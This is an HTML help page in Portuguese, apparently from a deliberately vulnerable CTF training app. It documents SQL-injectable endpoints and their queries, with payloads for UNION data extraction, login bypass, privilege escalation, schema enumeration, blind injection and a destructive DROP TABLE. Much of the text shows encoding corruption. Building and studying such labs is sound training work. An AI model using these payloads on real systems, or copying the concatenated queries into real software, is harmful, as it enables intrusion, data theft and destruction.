<section class="container">
  <h2>üö® Guia de SQL Injection - Vulnerabilidades</h2>
  
  <div class="security-warning" style="margin: var(--spacing-xl) 0;">
    ‚ö†Ô∏è ATEN√á√ÉO: Esta documenta√ß√£o exp√µe vulnerabilidades SQLi intencionais para fins educacionais de CTF!
  </div>

  <div class="card">
    <div class="card-body">
      <h3>üíâ Endpoints SQLi Vulner√°veis</h3>
      
      <div style="margin: var(--spacing-lg) 0;">
        <h4>1. Busca de Estudantes</h4>
        <div class="code-block">
          <strong>GET</strong> /students?q={payload}
        </div>
        <p><strong>Query:</strong> <code>SELECT id, name, email FROM students WHERE name LIKE '%{q}%'</code></p>
        <p><strong>Payload:</strong> <code>%' UNION SELECT 1,'admin','admin@test.com' -- </code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>2. Perfil de Estudante por ID</h4>
        <div class="code-block">
          <strong>GET</strong> /students/{id}
        </div>
        <p><strong>Query:</strong> <code>SELECT s.id, s.name, s.email, s.address, u.name as advisor FROM students s LEFT JOIN users u ON u.id = s.advisor_id WHERE s.id={id}</code></p>
        <p><strong>Payload:</strong> <code>1 UNION SELECT 1,'hacker','hacker@evil.com','secret_address','admin'--</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>3. Login (Email/Password)</h4>
        <div class="code-block">
          <strong>POST</strong> /login
        </div>
        <p><strong>Query:</strong> <code>SELECT id, name, role FROM students WHERE email='{email}' AND password='{password}'</code></p>
        <p><strong>Payload Email:</strong> <code>admin@test.com' OR '1'='1' --</code></p>
        <p><strong>Payload Password:</strong> <code>qualquer</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>4. Reset de Senha (Email)</h4>
        <div class="code-block">
          <strong>POST</strong> /forgot-password
        </div>
        <p><strong>Query:</strong> <code>SELECT id, name, email FROM students WHERE email='{email}'</code></p>
        <p><strong>Payload:</strong> <code>' UNION SELECT 1,'hacker','hacker@evil.com' FROM students WHERE '1'='1' --</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>5. Busca de Cursos</h4>
        <div class="code-block">
          <strong>GET</strong> /courses?search={payload}
        </div>
        <p><strong>Query:</strong> <code>SELECT id, code, title, seats FROM courses WHERE title LIKE '%{search}%' OR code LIKE '%{search}%'</code></p>
        <p><strong>Payload:</strong> <code>' UNION SELECT 1,'HACK','SQL Injection Course',999 --</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>6. Matr√≠cula em Curso</h4>
        <div class="code-block">
          <strong>POST</strong> /courses/{id}/enroll
        </div>
        <p><strong>Queries m√∫ltiplas vulner√°veis via {id}</strong></p>
        <p><strong>Payload:</strong> <code>1; INSERT INTO enrollments (student_id, course_id) VALUES (1, 999); --</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>7. Atualizar Perfil (Mass Assignment + SQLi)</h4>
        <div class="code-block">
          <strong>POST</strong> /students/{id}/update
        </div>
        <p><strong>Query:</strong> <code>UPDATE students SET {campos}='{valores}' WHERE id={id}</code></p>
        <p><strong>Payload no campo name:</strong> <code>admin', role='admin' WHERE id=1; --</code></p>
      </div>

      <div style="margin: var(--spacing-lg) 0;">
        <h4>8. Coment√°rios (XSS + SQLi)</h4>
        <div class="code-block">
          <strong>POST</strong> /students/{id}/comments
        </div>
        <p><strong>Query:</strong> <code>INSERT INTO comments (student_id, author_id, body) VALUES ({id}, {uid}, '{body}')</code></p>
        <p><strong>Payload:</strong> <code>'), (1, 1, 'injected comment'); --</code></p>
      </div>

      <div style="margin: var(--spacing-xl) 0;">
        <h4>üéØ Payloads √öteis</h4>
        <div class="payload-box">-- Extrair dados de usu√°rios
' UNION SELECT id, name, role FROM users --

-- Bypass de login
admin@test.com' OR '1'='1' --

-- Extrair esquema do banco
' UNION SELECT table_name, column_name, data_type FROM information_schema.columns --

-- Descobrir tabelas
' UNION SELECT table_name, 'table', 'discovery' FROM information_schema.tables --

-- Mass assignment + privil√©gio escalation  
name=hacker&role=admin

-- M√∫ltiplas queries (stacked queries)
1; DROP TABLE students; --

-- Time-based blind SQLi
1' OR SLEEP(5) --

-- Boolean-based blind SQLi
1' OR (SELECT COUNT(*) FROM users WHERE role='admin')=1 --</div>
      </div>

      <div style="margin: var(--spacing-xl) 0;">
        <h4>üîç Dicas de Explora√ß√£o</h4>
        <ul>
          <li><strong>Sempre termine com --</strong> para comentar o resto da query</li>
          <li><strong>Use UNION SELECT</strong> com o mesmo n√∫mero de colunas</li>
          <li><strong>Teste campos de busca</strong> para enumerar dados</li>
          <li><strong>Explore mass assignment</strong> em formul√°rios de atualiza√ß√£o</li>
          <li><strong>Combine com XSS</strong> em campos de texto livre</li>
          <li><strong>Use information_schema</strong> para descobrir estrutura do banco</li>
        </ul>
      </div>
    </div>
  </div>

  <div style="text-align: center; margin-top: var(--spacing-xl);">
    <a href="/" class="btn">üè† Voltar ao In√≠cio</a>
    <a href="/api-docs" class="button secondary">üìö Ver API Docs</a>
  </div>
</section>

<style>
.code-block {
  background: #1F2937;
  color: #F9FAFB;
  padding: var(--spacing-md);
  border-radius: var(--radius-sm);
  font-family: 'Courier New', monospace;
  margin: var(--spacing-sm) 0;
  border-left: 4px solid #EF4444;
}

.payload-box {
  background: #111827;
  color: #F87171;
  padding: var(--spacing-lg);
  border-radius: var(--radius-sm);
  font-family: 'Courier New', monospace;
  font-size: 0.9rem;
  overflow-x: auto;
  border: 2px solid #EF4444;
  margin: var(--spacing-md) 0;
  white-space: pre-line;
}

.code-block strong {
  color: #F59E0B;
}
</style>